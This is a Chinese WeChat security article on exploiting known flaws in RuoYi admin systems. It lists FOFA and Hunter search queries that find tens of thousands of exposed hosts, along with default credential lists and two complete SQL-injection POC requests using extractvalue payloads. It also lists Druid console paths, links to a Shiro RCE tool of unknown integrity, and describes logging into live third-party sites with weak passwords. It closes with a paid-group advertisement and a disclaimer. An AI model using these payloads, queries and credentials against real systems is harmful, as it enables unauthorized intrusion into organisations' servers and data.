> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac

#  【宝典】针对若依系统nday的常见各种姿势利用  
原创 神农Sec  神农Sec   2025-07-17 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
  
  
**0x1 前言**  
  
  
  
这篇文章也是在前几天跟着我几个厉害的师傅一起学习学的多种nday的打法，然后自己也是花了很多的时间在网上找相关若依系统的nday打法，然后自己利用FOFA和鹰图进行资产收集，然后进行渗透测试各个站点，然后把若依常见的姿势打出来给师傅们分享下！  
  
                       
  
**0x2 若依系统简介**  
  
  
###   
  
Ruoyi（若依）  
是一款基于  
Spring Boot  
和  
Vue.js  
开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
  
  
若依有很多版本，其中使用最多的是  
Ruoyi  
单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB78LY1UfTIqCr59hkpal5LvVng5Ob9nseno9cbESn4f4icuNUzoH2e4Bw/640?wx_fmt=png "")  
  
             
### 配合ruoyi的服务：  
  
****  
alibaba  
 druid  
            
  
alibaba  
 nacos  
            
  
spring            
  
redis            
  
mysql            
  
minio            
  
fastjson            
  
shiro            
  
swagger  
-ui.html  
            
  
mybatis  
  
      
            
  
             
  
             
  
**0x3 信息收集+资产收集**  
  
  
### 一、浅谈  
  
对于我们在渗透测试以及挖src的过程中，其实最先开始的信息收集以及对目标资产的资产收集是最重要的一个环节。  
这次带师傅们来对我们这次若依系统的一个资产收集，常见的资产收集的话就是直接使用一些安全空间引擎，比如常用的FOFA、鹰图等，还有就是一些企业查询的，比如爱企查、企查查等，然后使用里面的检索语法去做一个信息收集。  
  
             
  
             
### 二、拓展  
  
首先给师傅们看下若依系统最经典的加载界面，就是这样的一个加载页面，其实见多了的师傅会发现这个若依系统的加载界面其实和blade的加载界面很像的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7s4iaiaAjOYKYAUqwxUibXu4XSYHkw5TcAQrCtDaeEH9Pz2VukZ2dkxVxw/640?wx_fmt=png "")  
  
             
  
blade登录后台网站特征  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7j9pZ1KUnMqgS3A0WVZ82fO3dPk5sxDNoa4nu4x5eTWXgGib0OvaQianQ/640?wx_fmt=png "")  
  
    
### 三、FOFA  
  
下面这个绿色的小草就是若依的icon图标，然后就可以拿这个直接去FOFA检索了  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7eSdSEjGfN1oE3SghwlnkdibTyM9vzO38dn9Sy8SeqFD8d8AiaR8cphtg/640?wx_fmt=png "")  
  
             
  
**FOFA检索语法如下：**  
  
(  
icon_hash  
=  
"-1231872293"  
 || icon_hash=  
"706913071"  
)  
            
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7t9Sed4RurYbmRZsFXtlDRVzpCXoqWiaqBW853zhEEUvKW0Qau3PQ87A/640?wx_fmt=png "")  
  
             
        
  
然后可以看到其实是有两种颜色的小草icon图标的，都是常见的若依系统  
    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7vzhiaA0k8B7YrH9KJSCCicb6WLZXDGN0c3JsbokJytqV4oDbxWZpPbibA/640?wx_fmt=png "")  
  
      
  
可以看到这里利用上面的语法可以检索出来差不多七万多条独立的IP数，其实不止这些，像很多网站都魔改，然后比如icon图标都会修改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7neXOWUTEyvNhdWq2YAB8QDoTibxicBDjUSA7eLtXXLC1ewn9aVk1Y1YQ/640?wx_fmt=png "")  
  
             
### 四、鹰图  
  
鹰图的检索语法如下：  
  
web  
.body=  
"若依后台管理系统"  
            
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7C86lpxV56u3VjtzRsNJNaicIjMV7b8hiaKucmz4TadSkUSwm8OkM8Cibw/640?wx_fmt=png "")  
  
             
    
  
             
  
**0x4 若依系统打nday的手法**  
  
  
## ‍  
### 漏洞一：弱口令漏洞  
## 下面是常见的若依系统的弱口令，但是其中我碰到的若依弱口令都是admin:admin123、ry:admin123这两套账号密码，要是弱口令尝试不出来就撤吧了，因为若依的前端漏洞特别少  
  
用户：admin ruoyi druid            
  
密码：123456 admin druid admin123 admin888  
            
            
  
             
  
这里直接就是弱口令登录进去了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7REGn3OdgrvbNlEW2bG9RcUKC6ibuxmo8icd2j6Z1foqbYG4A0CO2g3AA/640?wx_fmt=png "")  
  
   
  
     
### 漏洞二：SQL注入漏洞  
### 都是POST请求方式  
  
注入点一：：  
在/system/role/list接口的params[dataScope]参数  
  
POC如下：  
  
POST  
 /system/role  
/list  
 HTTP/  
1  
.  
1  
            
  
Host  
:   
            
  
Content  
-Length:   
179  
            
  
sec  
-ch-ua:   
"Chromium"  
;v=  
"109"  
,   
"Not_A Brand"  
;v=  
"99"  
            
  
Accept  
: application/json, text/javascript, */*; q=  
0  
.  
01  
            
  
Content  
-Type: application/x-www-form-urlencoded  
            
  
X  
-Requested-With: XMLHttpRequest  
            
  
sec  
-ch-ua-mobile: ?  
0  
            
  
User  
-Agent:   
            
  
Cookie  
:   
            
  
Connection  
: close            
  
            
  
pageSize  
=  
&  
pageNum  
=  
&  
orderByColumn  
=  
&  
isAsc  
=  
&  
roleName  
=  
&  
roleKey  
=  
&  
status  
=  
&  
params  
[beginTime]=  
&  
params  
[endTime]=  
&  
params  
[dataScope]=and extractvalue(  
1  
,concat(0x7e,(select database(  
))  
,0x7e  
)  
            
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7xaF9UXOxPoK1exapElYnO5YdegcicOb4Hr7auegapwldevwicg4TmI3A/640?wx_fmt=png "")  
  
            
  
             
  
注入点二：  
/system/dept/edit  
      
ancestors参数存在SQL漏洞  
  
RuoYi  
    
v4.6版本  
  
POC 如下：  
  
POST   
/  
system  
/  
dept  
/  
edit HTTP  
/  
1.1  
            
  
Host  
:  
             
  
Content  
-  
Length  
:  
  
179  
            
  
sec  
-  
ch  
-  
ua  
:  
  
"Chromium"  
;  
v  
=  
"109",   
"Not_A Brand"  
;  
v  
=  
"99"  
            
  
Accept  
:  
 application  
/  
json, text  
/  
javascript,   
*/*  
;  
 q  
=  
0.01  
            
  
Content  
-  
Type  
:  
 application  
/  
x  
-  
www  
-  
form  
-  
urlencoded            
  
X  
-  
Requested  
-  
With  
:  
 XMLHttpRequest            
  
sec  
-  
ch  
-  
ua  
-  
mobile  
:  
 ?  
0  
            
  
User  
-  
Agent  
:  
             
  
Cookie  
:  
             
  
Connection  
:  
 close            
  
              
  
DeptName  
=  
1  
&  
deptid  
=  
100  
&  
ParentId  
=  
12  
&  
Status  
=  
0  
&  
ordernum  
=  
1  
&  
ancestors  
=  
0  
)  
or  
(  
extractvalue  
(  
1,concat  
((  
select user  
()))));  
#  
            
  
             
         
  
其中最简单的测试方式就是直接把url以及cookie值拿到若依工具去检测  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7p5EKztIWic7hmkN3iaAkj9ACcyjGdjcuFdq8pgbjTddUClw8L87P18tA/640?wx_fmt=png "")  
  
      
  
             
  
这里需要注意的是这个小饼干插件，新版本的若依系统的cookie值是Admin-Token值且是JWT编码的，右边的是老版本的，就是jsessionid值  
    
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB78Yo8HXrIdZTpBibPiazibg4Ehsm0tUI0V0QfNtO5j7oexFbDnp7Ozh9mA/640?wx_fmt=png "")  
  
             
### 漏洞三：druid页面渗透  
  
可以看到bp数据包里面有很多的/prod-api接口，其实看若依系统多的师傅们都这到这个接口就是若依框架的常见的一个关键字接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB714Dc31yYQPDYxAy8Qib9zNBmiaubJngyDW4e7Wg5dKe5QOsJR4sApn8g/640?wx_fmt=png "")  
  
  
druid常见访问路径：  
  
/druid/index.html            
  
/druid/login.html            
  
/prod-api/druid/login.html            
  
/prod-api/druid/index.html            
  
/dev-api/druid/login.html            
  
/dev-api/druid/index.html            
  
/api/druid/login.html            
  
/api/druid/index.html            
  
/admin/druid/login.html            
  
/admin-api/druid/login.html  
  
      
            
  
             
  
直接访问这个常用的路径，直接爆出来了druid的登录后台的页面，这样我们就是可以尝试使用弱口令登录，或者通过bp抓包然后进行账号密码爆破，账号一般是admin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7RUiany47Bj1MW0p3RflibdIxBCSsmZTWV4u8Be1lsEn6zp2xRFpaVMIw/640?wx_fmt=png "")  
  
             
    
  
下面就直接利用弱口令登录成功了，然后后面就可以尝试打下druid的nday漏洞了  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7q43B4dUkYtBpuY5icbx2EIwGux9ibBvaYnAtU9SrTScvHMriaSJnxibBMA/640?wx_fmt=png "")  
  
     
  
可以看到在URL监控里面泄露了很多的敏感信息接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7IXYp0GEAw8Zj5SWkBJacb5VVnH7HwLFItv6BtYiaogGgKmfQcicGeXSw/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7sLibvqe0EwMwuZ17pXf4m7GdjlY1icUXjEuw5tn2RY4PZvj0DGb2dlCw/640?wx_fmt=png "")  
  
             
  
然后还可以使用swagger插件进行信息泄露的利用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7Fbvqq8kD0YpJZDP55QmicneFp8SdCR9CdVc8pXHFohqXCwoC4DfibIrg/640?wx_fmt=png "")  
  
             
### 漏洞四：默认shiro key命令执行漏洞  
### 直接使用Liqunkit工具梭哈，目前github上的Liqunkit工具都被下架了，下面是直接使用百度网盘分享下这个工具  
  
链接：https://pan.baidu.com/s/1SzyVpnFvP0Qfp1Z1stpyug            
  
提取码：1tyl          --是否有后门自行测试  
            
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7NUyF3NOupQXXmxfH8ZrZdWxgZJPDCx0RVXxibwZia0IJeibib4Dy11ttibQ/640?wx_fmt=png "")  
  
             
  
             
### 漏洞五：弱口令+历史漏洞结合  
### 下面这个网站我是直接访问，然后页面自动显示了账号密码的，账号是admin，但是密码加密了，但是懂点语言相关的师傅们都知道，这个直接在源代码里面，把password改成别的或者直接删掉就可以回显密码了      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7uEqFJFaraMT0mfSJ9WFUkc4XB6xPoaWJMUxIovztxacHmOicBNOboTQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB79lsT6ib2p4Fbdl9GytGVPbLcic41nHiaq45rd5IOQr1pfviap25nSsXFMw/640?wx_fmt=png "")  
  
  
直接改下password参数，然后就可以看到密码了，然后直接登录后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7CwlggcDP4DQBCibKrgRF8cNz9H3WdmQricEFdc61e2dQeBIjqHnLI8eQ/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7YJfibw8toMwYKbkpLjcygDMzD60GsBbWjjsnJEGVTialoZ4CcKXLG7LQ/640?wx_fmt=png "")  
  
             
   
  
然后我再利用鹰图去测试下源代码里面的特殊关键字，看看跟这个站点一样的网站还有没有，  
  
利用鹰图检索出来了蛮多的网站，但是独立的IP数量就只有两个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7N5OdDZuibYEIJyxrooVShfR3sAmmhuJ8aDjbtpA2RFl16TKVu3A6WqQ/640?wx_fmt=png "")  
  
  
使用admin:admin123再拿别的网站测试，发现利用同样的手法也都是可以登录成的  
  
这个主要是给师傅们分享下打站点的思路，这个站点的通杀手法没什么特别大价值，但是思路很重要。  
      
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB78xNowpyhlQNgVd1u0M5xVKPD1bW842maW18lNazmddV7tH6YKK6gkw/640?wx_fmt=png "")  
  
             
### 漏洞六：Spring-Boot漏洞  
### 师傅们可以看到下面这个站点哈，说是若依的系统，但是没有任何的若依的特征，像碰到这样的站点，师傅们该怎么去测试呢？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7mB4lEj6WeXHxoOzyT6NCBdTBYD2AmkHRnme0dtNy5uyKtEftaAAj1Q/640?wx_fmt=png "")  
  
             
  
下面就给师傅们分享下思路，我们可以使用若依的常见的路径，然后进行一个路径的拼接  
  
常见访问路径：  
  
/druid/index.html            
  
/druid/login.html            
  
/prod-api/druid/login.html            
  
/prod-api/druid/index.html            
  
/dev-api/druid/login.html            
  
/dev-api/druid/index.html            
  
/api/druid/login.html            
  
/api/druid/index.html            
  
/admin/druid/login.html          /admin-api/druid/login.html  
            
  
             
  
拼接路径成功后，可以看到下面的页面回显的不就是经典的spring-boot报错页面嘛  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7sIiaJbGmvL23jYrExFxHbuwib3qIJFVeRVU3BI2zeFJdicpXVMNsXQOPg/640?wx_fmt=png "")  
  
       
  
然后就可以使用曾哥的spring-boot 工具扫描下，然后看看泄露的信息有什么，  
      
  
扫描结果显示确实存在spring-boot框架漏洞，后面的就是直接去访问泄露的接口url了，这个不是给师傅们分享的重点，后面的信息泄露就不给师傅们拿出来了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7ut7TMwCbTbCCXXSkPVTVO0ZejsjMxtO4aACQDB3cmhUibRZAJuPxOaQ/640?wx_fmt=png "")  
  
             
  
  
**0x5 路径拼接通杀漏洞**  
  
  
###   
  
直接利用FOFA或者鹰图去检索下面的关键字，然后看看可以打一波通杀漏洞  
  
欢迎使用RuoYi后台管理框架，当前版本：v3.8.5，请通过前端地址访问  
            
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVLy1ItE0DqHNNtibUVK3GB7IFnj15YkXmT3OiaVniaL0zYYDYapLeQIXcSvZKvIyyqrmTiaNlWmo0oaQ/640?wx_fmt=png "")  
  
  
使用下面的账号密码登录，ruoyi:123456  
  
用户：admin ruoyi druid            
  
密码：123456 admin druid admin123  
            
  
             
  
常见访问路径：  
  
/druid/index.html            
  
/druid/login.html            
  
/prod-api/druid/login.html            
  
/prod-api/druid/index.html            
  
/dev-api/druid/login.html            
  
/dev-api/druid/index.html            
  
/api/druid/login.html            
  
/api/druid/index.html            
  
/admin/druid/login.html         /admin-/api/druid/login.html  
            
  
             
  
**0x6 总结**  
  
  
###   
  
上面就是简单给师傅们介绍下若依系统的信息收集，包括主要使用FOFA和鹰图怎么去检索相关若依的漏洞。  
然后后面给师傅们演示了几个类型的nday的打法。  
主要是给师傅们分享下思路以及经验，对于若依系统的常见姿势的一个打法总结汇总。  
    
            
  
希望对师傅们有帮助哈！！！  
  
        
  
  
**内部小圈子详情介绍**  
  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```

  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
星球现价   
￥45元  
  
如果你觉得应该加入，就不要犹豫，价格只会上涨，不会下跌  
  
星球人数少于1000人 45元/年  
  
星球人数少于1200人 65元/年  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKogHTNRKIZQVcM0QQE3wbFrFciafzrEaRcia7gkRFb4vujBubqic3sPIN1g/640?wx_fmt=png&from=appmsg "")  
  
欢迎加入星球一起交流，券后价仅45元！！！ 即将满1000人涨价  
  
长期  
更新，更多的0day/1day漏洞POC/EXP  
  
  
  
**内部知识库--**  
**（持续更新中）**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
内部小圈子——  
圈友反馈  
（  
良心价格  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXWwRdxNQnWo5Eq7BzgsIKovBgx57dc6Ql2yRSPBJGA5fde4sQJzOomD1GURVibZeCNzXM6iaGrSe8Q/640?wx_fmt=jpeg&from=appmsg "")  
  
    

```
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
